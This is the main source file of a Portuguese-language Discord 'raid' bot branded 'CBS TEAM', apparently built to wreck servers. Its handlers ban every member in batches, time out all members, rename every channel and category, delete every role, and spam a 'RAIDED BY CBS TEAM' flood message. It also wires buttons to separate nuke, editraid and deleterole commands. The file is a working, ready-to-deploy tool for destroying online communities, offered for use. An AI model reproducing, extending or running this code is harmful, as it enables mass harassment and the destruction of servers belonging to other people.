const { Client, GatewayIntentBits, REST, Routes, Collection, ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
const dotenv = require('dotenv');
const cron = require('node-cron');
const express = require('express');
const fs = require('fs');

dotenv.config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
  ]
});

// Coleções
client.commands = new Collection();
client.menuCommands = new Collection();

// Carregar comandos
const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js'));
const commands = [];

for (const file of commandFiles) {
  const command = require(`./commands/${file}`);
  if (command.data) {
    client.commands.set(command.data.name, command);
    commands.push(command.data.toJSON());
  }
  if (command.name) {
    client.menuCommands.set(command.name, command);
  }
}

// ============ EVENTO READY ============
client.once('ready', async () => {
  console.log(`✅ ${client.user.tag} está online!`);
  console.log(`📊 Servidores: ${client.guilds.cache.size}`);

  const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
  try {
    console.log('🔄 Registrando comandos...');
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log(`✅ ${commands.length} comandos registrados!`);
  } catch (error) {
    console.error('❌ Erro:', error);
  }

  client.user.setPresence({
    activities: [{ name: '!menu | CBS TEAM', type: 3 }],
    status: 'online'
  });

  cron.schedule('*/5 * * * *', () => console.log('🔄 Keep-alive'));
  console.log('📋 Digite !menu no Discord');
});

// ============ SLASH COMMANDS ============
client.on('interactionCreate', async interaction => {
  if (interaction.isCommand()) {
    const command = client.commands.get(interaction.commandName);
    if (!command) return;
    try {
      await command.execute(interaction, client);
    } catch (error) {
      console.error(error);
      await interaction.reply({ content: '❌ Erro.', flags: 64 });
    }
  }
});

// ============ MODAIS ============
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;

  const modalId = interaction.customId;

  // ===== EDIT RAID =====
  if (modalId === 'editRaidModal') {
    const categoria = interaction.fields.getTextInputValue('categoriaInput');
    const mensagem = interaction.fields.getTextInputValue('mensagemInput');
    
    const config = require('./config');
    if (categoria) config.raid.baseName = categoria;
    if (mensagem) config.raid.spamMessage = mensagem;
    
    await interaction.reply({
      content: `✅ **CONFIGURAÇÕES ATUALIZADAS!**\n📂 Categoria: \`${categoria || 'mantida'}\`\n💬 Mensagem: \`${mensagem || 'mantida'}\``,
      flags: 64
    });
  }

  // ===== RENAME =====
  if (modalId === 'renameModal') {
    const tipo = interaction.fields.getTextInputValue('tipoInput').toLowerCase();
    const nome = interaction.fields.getTextInputValue('nomeInput');
    const guild = interaction.guild;

    if (tipo === 'canal') {
      const channels = guild.channels.cache.filter(c => c.type === 0);
      let count = 0;
      for (const [id, ch] of channels) {
        try { await ch.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} canais renomeados para \`${nome}\``, flags: 64 });
    } else if (tipo === 'categoria') {
      const categories = guild.channels.cache.filter(c => c.type === 4);
      let count = 0;
      for (const [id, cat] of categories) {
        try { await cat.setName(nome); count++; } catch {}
      }
      await interaction.reply({ content: `✅ ${count} categorias renomeadas para \`${nome}\``, flags: 64 });
    } else {
      await interaction.reply({ content: '❌ Tipo inválido! Use "canal" ou "categoria"', flags: 64 });
    }
  }

  // ===== BANALL =====
  if (modalId === 'banAllModal') {
    const motivo = interaction.fields.getTextInputValue('motivoInput') || 'RAID BY CBS TEAM';
    const guild = interaction.guild;
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId && !m.user.bot);

    if (members.size === 0) {
      return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
    }

    await interaction.reply({ content: `🔨 BANINDO ${members.size} membros...`, flags: 64 });
    let banidos = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.ban({ reason: motivo }).catch(() => {})));
      banidos += chunk.length;
      await interaction.editReply(`🔨 ${banidos}/${members.size} banidos`);
    }
    await interaction.editReply(`✅ **${banidos} MEMBROS BANIDOS!**`);
  }

  // ===== END =====
  if (modalId === 'endModal') {
    const minutos = parseInt(interaction.fields.getTextInputValue('minutosInput')) || 60;
    const duracao = minutos * 60 * 1000;
    const guild = interaction.guild;
    const botId = interaction.client.user.id;
    const members = guild.members.cache.filter(m => m.id !== botId);

    if (members.size === 0) {
      return interaction.reply({ content: '⚠️ Nenhum membro.', flags: 64 });
    }

    await interaction.reply({ content: `⏰ TIMEOUT em ${members.size} membros...`, flags: 64 });
    let timeoutados = 0;
    const list = [...members.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(m => m.timeout(duracao, 'RAID CBS').catch(() => {})));
      timeoutados += chunk.length;
      await interaction.editReply(`⏰ ${timeoutados}/${members.size} timeout`);
    }
    await interaction.editReply(`✅ **${timeoutados} MEMBROS EM TIMEOUT POR ${minutos} MIN!**`);
  }
});

// ============ !MENU ============
client.on('messageCreate', async message => {
  if (message.author.bot) return;
  if (!message.content.startsWith('!')) return;

  const args = message.content.slice(1).trim().split(/ +/);
  const commandName = args.shift().toLowerCase();
  const command = client.menuCommands.get(commandName);
  if (!command) return;

  try {
    await command.execute(message, args, client);
  } catch (error) {
    console.error(error);
    await message.reply('❌ Erro.');
  }
});

// ============ BOTÕES ============
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;

  const mensagemSpam = 
    `**RAIDED BY CBS TEAM** https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif ꧁꧂꧁꧂꧁꧂**꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂꧁꧂`;

  // ===== SPAM 1 VEZ =====
  if (interaction.customId === 'spam1') {
    await interaction.deferReply({ flags: 64 });
    
    const channel = interaction.channel;
    let enviadas = 0;

    for (let i = 0; i < 1; i++) {
      try {
        await channel.send({ content: mensagemSpam });
        enviadas++;
      } catch (e) {
        console.error('Erro ao spammar:', e);
      }
    }

    await interaction.editReply(`✅ **${enviadas} mensagem enviada com sucesso!** 💬`);
    return;
  }

  // ===== SPAM 2 VEZES =====
  if (interaction.customId === 'spam2') {
    await interaction.deferReply({ flags: 64 });
    
    const channel = interaction.channel;
    let enviadas = 0;

    for (let i = 0; i < 2; i++) {
      try {
        await channel.send({ content: mensagemSpam });
        enviadas++;
      } catch (e) {
        console.error('Erro ao spammar:', e);
      }
    }

    await interaction.editReply(`✅ **${enviadas} mensagens enviadas com sucesso!** 💬`);
    return;
  }

  // ===== NUKE =====
  if (interaction.customId === 'nuke') {
    const cmd = client.commands.get('nuke');
    if (cmd) {
      try {
        await cmd.execute(interaction, client);
      } catch (error) {
        console.error(error);
        await interaction.reply({ content: '❌ Erro.', flags: 64 });
      }
    }
    return;
  }

  // ===== EDIT RAID =====
  if (interaction.customId === 'editraid') {
    const cmd = client.commands.get('editraid');
    if (cmd) {
      try {
        await cmd.execute(interaction, client);
      } catch (error) {
        console.error(error);
        await interaction.reply({ content: '❌ Erro.', flags: 64 });
      }
    }
    return;
  }

  // ===== RENAME =====
  if (interaction.customId === 'rename') {
    const cmd = client.commands.get('rename');
    if (cmd) {
      try {
        await cmd.execute(interaction, client);
      } catch (error) {
        console.error(error);
        await interaction.reply({ content: '❌ Erro.', flags: 64 });
      }
    }
    return;
  }

  // ===== BANALL =====
  if (interaction.customId === 'banall') {
    const cmd = client.commands.get('banall');
    if (cmd) {
      try {
        await cmd.execute(interaction, client);
      } catch (error) {
        console.error(error);
        await interaction.reply({ content: '❌ Erro.', flags: 64 });
      }
    }
    return;
  }

  // ===== END =====
  if (interaction.customId === 'end') {
    const cmd = client.commands.get('end');
    if (cmd) {
      try {
        await cmd.execute(interaction, client);
      } catch (error) {
        console.error(error);
        await interaction.reply({ content: '❌ Erro.', flags: 64 });
      }
    }
    return;
  }

  // ===== DELETEROLE =====
  if (interaction.customId === 'deleterole') {
    const cmd = client.commands.get('deleterole');
    if (cmd) {
      try {
        await cmd.execute(interaction, client);
      } catch (error) {
        console.error(error);
        await interaction.reply({ content: '❌ Erro.', flags: 64 });
      }
    }
    return;
  }

  // ===== CONFIRMAR DELETEROLE =====
  if (interaction.customId === 'confirmDeleteRoles') {
    const guild = interaction.guild;
    const roles = guild.roles.cache.filter(r => r.id !== guild.id);
    await interaction.deferReply({ flags: 64 });
    let deletados = 0;
    const list = [...roles.values()];
    for (let i = 0; i < list.length; i += 10) {
      const chunk = list.slice(i, i + 10);
      await Promise.all(chunk.map(r => r.delete().catch(() => {})));
      deletados += chunk.length;
      await interaction.editReply(`🗑️ ${deletados}/${roles.size} deletados`);
    }
    await interaction.editReply(`✅ **${deletados} CARGOS DELETADOS!**`);
  }

  // ===== CANCELAR DELETEROLE =====
  if (interaction.customId === 'cancelDeleteRoles') {
    await interaction.reply({ content: '❌ Cancelado.', flags: 64 });
  }
});

// ============ SERVIDOR HTTP ============
const app = express();
const port = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('🤖 CBS TEAM BOT ONLINE!'));
app.listen(port, () => console.log(`🌐 HTTP rodando na porta ${port}`));

// ============ LOGIN ============
client.login(process.env.DISCORD_TOKEN);

// ============ TRATAMENTO DE ERROS ============
process.on('unhandledRejection', error => console.error('❌ Erro não tratado:', error));
process.on('uncaughtException', error => console.error('❌ Exceção não capturada:', error));